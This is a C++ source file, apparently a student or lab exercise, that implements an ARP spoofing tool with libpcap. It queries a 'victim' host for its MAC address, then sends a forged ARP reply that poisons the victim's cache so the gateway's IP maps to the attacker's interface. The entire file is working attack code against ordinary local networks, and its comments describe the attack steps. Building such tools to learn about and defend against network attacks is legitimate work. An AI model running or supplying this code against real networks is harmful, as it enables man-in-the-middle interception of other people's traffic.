#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

/* pragma pack -> no empty memory space between members -> consecutive */
#pragma pack(push, 1)
struct EthArpPacket{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Attackinfo{
	Mac my_mac;
	Ip my_ip;
	Mac sender_mac;		// victim mac
	Ip sender_ip;		// victim ip
	Ip target_ip;		// usually gateway's ip
};

void usage(char* pathname){
	printf("syntax: %s <interface> <sender(victim) ip> <target ip>\n", pathname);
	printf("sample: %s wlan0 192.168.10.2 192.168.10.1\n", pathname);
}

///////////////////////////////// these codes are from web //////////////////////////
uint8_t* get_my_mac(char* dev){
	int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)dev, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFHWADDR, &ifr);

	static uint8_t mymac[6];
	for(int i = 0; i < 6; i++) mymac[i] = (uint8_t)ifr.ifr_hwaddr.sa_data[i];

	close(sockfd);
	
	return mymac;
}

uint32_t get_my_ip(char* dev){
	int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)dev, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFADDR, &ifr);
	close(sockfd);
	
	return ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
}
/////////////////////////////////////////////////////////////////////////////////////

void make_arp_req(EthArpPacket* packet, Mac s_mac, Ip s_ip, Ip t_ip){
	packet->eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet->eth_.smac_ = s_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
    packet->arp_.op_ = htons(ArpHdr::Request);
    packet->arp_.smac_ = s_mac;
    packet->arp_.sip_ = s_ip;
    packet->arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet->arp_.tip_ = htonl(t_ip);
}

void make_arp_inf_packet(EthArpPacket* packet, Mac d_mac, Mac s_mac, Ip s_ip, Ip t_ip){
	packet->eth_.dmac_ = d_mac;
    packet->eth_.smac_ = s_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
    packet->arp_.op_ = htons(ArpHdr::Reply);
    packet->arp_.smac_ = s_mac;
    packet->arp_.sip_ = htonl(s_ip);
    packet->arp_.tmac_ = d_mac;
    packet->arp_.tip_ = htonl(t_ip);
}

int main(int argc, char* argv[]){
	if (argc != 4) {
		usage(argv[0]);
		return -1;
	}

	/* preparing for pcap and open handler*/
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;
	pcap_t* handler = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handler == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	Attackinfo info;

	/* 1. gets attack information */
	info.my_mac = Mac(get_my_mac(dev));
	info.my_ip = Ip(get_my_ip(dev));
	info.sender_ip = Ip(argv[2]);
	info.target_ip = Ip(argv[3]);

	/* 2. make arp request to sender to get sender_mac */
	make_arp_req(&packet, info.my_mac, info.my_ip, info.sender_ip);
	
	/* 3. send the arp req packet to the sender(victim) */
	res = pcap_sendpacket(handler, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handler));
    }
	
	/* 4. get packets until arp reply from the sender is captured */
	while(true){
		struct pcap_pkthdr* header;
		EthArpPacket* packet_ptr;
		
		// listening packets
		res = pcap_next_ex(handler, &header, (const u_char**)(&packet_ptr));
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handler));
			break;
		}
		
		// check if the packet is right
		if((ntohs(packet_ptr->eth_.type_) == EthHdr::Type::Arp) && (packet_ptr->eth_.dmac_ == info.my_mac)){
			
			/* 5. if right, make attack packet and send */
			info.sender_mac = packet_ptr->eth_.smac_;
			make_arp_inf_packet(packet_ptr, info.sender_mac, info.my_mac, info.target_ip, info.sender_ip);
			res = pcap_sendpacket(handler, reinterpret_cast<const u_char*>(packet_ptr), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handler));
			}
			break;
		}
	}
	pcap_close(handler);
}
